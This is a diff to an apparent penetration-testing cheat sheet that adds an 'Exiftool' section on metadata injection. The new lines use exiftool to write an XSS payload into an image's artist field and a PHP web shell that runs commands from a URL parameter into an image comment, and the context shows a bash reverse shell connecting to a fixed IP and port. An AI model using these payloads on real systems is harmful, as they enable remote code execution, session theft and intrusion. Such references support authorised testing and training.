@@ -54,7 +54,7 @@
 * [Webshell](#Webshell)
 * [ReverseShell](#ReverseShell)
 * [Searchsploit](#Searchsploit)
-
+* [Exiftool](#Exiftool)
 
 # Tools
 
@@ -675,4 +675,21 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 searchsploit [keyword]
 searchsploit -p [EDB-ID]
 ~~~
+
+
+# Exiftool
+
+## exif injection
+
+~~~ bash
+exiftool exif.jpg -artist="<svg/onload=alert(45)>"
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.png
+~~~
+
+reference: https://www.hahwul.com/blog/2017/web-hacking-metadata-payload/
+
+
+
+
+
 
